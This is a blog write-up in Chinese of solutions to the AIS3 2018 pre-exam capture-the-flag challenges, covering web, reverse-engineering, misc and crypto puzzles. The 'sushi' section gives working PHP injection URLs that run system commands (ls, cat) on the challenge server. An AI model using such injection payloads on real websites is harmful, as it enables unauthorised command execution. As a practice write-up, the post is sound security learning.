---
title: AIS3 2018 write-up
date: 2018-10-31 00:49:29
tags:
- CTF
- AIS3
- Security
categories:
- CTF
keywords: 
- ais3
- ctf
- security
description: 
---
今年第二次參加 AIS3 pre-exam 的感想
* 要用到程式解的地方滿多的
* Web2 對網路環境不好的人會跑很久
* Misc2 超多假 flag，要找到真的根本要通靈＝＝
<!--more-->

## Web

### 1. warmup
1. 打開 `開發者工具`，可以看到 `response headers` 裡面有奇怪的 `Partial-Flag`
![](https://i.imgur.com/rcEXreL.png)

2. 再看看網址列上有奇怪的參數，嘗試去改改看它，會發現 `partial flag` 跟著變了
![](https://i.imgur.com/DQfYv70.png)

3. 再仔細觀察一下，發現前四個 `partial flag` 是 AIS3，所以可以知道 `partial flag` 組合起來就是這題的 `flag` 了。

4. 但這題 `flag` 有點長，所以我用 Python 來解
    ```python=
    import requests
    for i in range(50):
        r = requests.get("http://104.199.235.135:31331/index.php?p={}".format(i))
        key = r.headers['Partial-Flag']
        if key == '':
            print(' ', end='')
        else:
            print(key, end='')
    ```

### 2. hidden
1. 打開網頁就看到這行字
![](https://i.imgur.com/5OJsVE0.png)

2. 因為看到上面顯示的文字，所以想到 secret page 可能藏在 `robots.txt` 裡
![](https://i.imgur.com/uy25Pq8.png)

3. 進到 `_hidden_flag_.php` 頁面之後，發現還是沒有看到 `flag`。
![](https://i.imgur.com/ZtBmkWv.png)

4. 打開 `開發者工具` 查看 HTML，發現按鈕會送出奇怪的 `form-data`。
![](https://i.imgur.com/zz829Vy.png)

5. 按了幾次按鈕後，會發現 `c` 不斷的再增加， `s` 也跟著變
![](https://i.imgur.com/dsAPbmV.png)

6. 透過 `開發者工具` 的看看 `response`，發現了奇怪的假 `flag`
![](https://i.imgur.com/MxqkyK1.png)

6. 拿 Python 去跑跑看，跑到幾萬後會發現 `response` 的 `Flag` 變了，`flag` 就出來的
    ```python=
    import requests
    from bs4 import BeautifulSoup
    payload = {'c': "1", 's': '3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb'}
    while True:
        r = requests.post('http://104.199.235.135:31332/_hidden_flag_.php', payload)
        soup = BeautifulSoup(r.content, "html.parser")
        print(r.headers)
        f = open('ans.txt', 'a')
        f.write(str(r.headers)+"\n")
        if 'AIS3{NOT_A_VALID_FLAG}' not in str(r.headers):
            break
        c = soup.find("input", {"name":'c'})['value']
        s = soup.find("input", {"name":'s'})['value']
        payload = {'c': c, 's': s}    
    ```

### 3. sushi
這題查了一下資料，嘗試很多次，最後發現考的好像是 `php double quote`
1. 可以印出當前檔案目錄
    ```
    http://104.199.235.135:31333/?🍣=${@system(ls)}
    ```
    ![](https://i.imgur.com/rHdn9mO.png)

2. 因為這題 `.htaccess` 沒有限制，所以可以直接訪問 `flag`
    ```
    http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ
    ```

3. 不過如果有限制，可以利用下面的解法來印出 `flag`
    ```
    http://104.199.235.135:31333/?🍣=".`$_GET[1]`."&1=cat flag_name_1s_t00_l0ng_QAQQQQQQ
    ```


## Reverse
### 1. find
這題只是將 `flag` 藏在檔案中，可以用記事本或是編輯器打開，用 `ctrl+f` 很快就能找到了。
1. 如果是用 linux 或 mac 有更快的解法
![](https://i.imgur.com/70zIglq.png)

### 3. crackme
1. 猜測這是用 .NET 寫的，所以用 [dnSpy](https://github.com/0xd4d/dnSpy) 來打開它
2. 在 `MainWindow` 中看到疑似 `flag` 的東西
![](https://i.imgur.com/9eywW9l.png)

4. 發現 `secret` 是用 XOR 加密然後轉成 int 
![](https://i.imgur.com/jy0YJuo.png)

6. 用 Python 來解
    ```python=
    #!/usr/bin/env python3
    list = [234, 226, 248, 152, 208, 154, 223, 244, 226, 158, 244, 238, 234, 216, 210, 244, 223, 228, 244, 232, 249, 159, 200, 192, 244, 230, 206, 138, 214]
    for i in list:
        print(chr(i^171), end='')   
    ```
## Misc
### 1. welcome
送分題，看影片拿 flag
### 2. flags
這題可以找到 3 個假 `flag`，要找到真 `flag` 根本要通靈＝＝
1. 用編輯器開他，會發現有假 `flag` 藏在其中
2. 將檔名改成 jpg，會看到圖片上面顯示著假 `flag`
![](https://i.imgur.com/kZBhDwS.jpg)

4. 用 `binwalk` 去分析檔案，會發現其中藏著 zip
![](https://i.imgur.com/uIHBkQb.png)

4. 用 dd 把其中的 zip 拆出來
    ```shell
    dd if=flags.jpg of=flag skip=48932 bs=1
    ```
5. 拆出來的 zip 有密碼，所以用 `pkcrack` 來破解
    ```shell
    pkcrack -c backup/Avengers_Infinity_War_Poster.jpg -p Avengers_Infinity_War_Poster.jpg -C flag.zip -P photo.zip
    ```
7. 破解完後拿到裡面的 `flag` 檔，發現還是假的＝＝
8. 最後透過主辦方給出的提示，回到第二步那張圖，盯了老半天，發現那個框框藏有**摩斯密碼**...
![](https://i.imgur.com/kZBhDwS.jpg)


## Crypto
### 1. POW
這題考的就是 `proof of work`
1. 用 Python 暴力去運算比對是否符合條件
    ```python=
    #!/usr/bin/env python3
    import itertools
    import string
    from hashlib import *
    from pwn import *

    r = remote('104.199.235.135', 20000)
    r.recvuntil("condition : x[:6] == '")
    cond = r.recvuntil("'").decode('ascii').rstrip("'")
    r.recvuntil('x = ')
    ans = ''
    alphanumeric = string.ascii_uppercase + string.ascii_lowercase + string.digits
    for s in itertools.product(alphanumeric, repeat=4):
        if sha256(('%s%s'%(cond, ''.join(s))).encode('utf-8')).hexdigest().startswith('000000'):
            ans = cond + ''.join(s)
            break
    r.sendline(ans)
    r.interactive()
    ```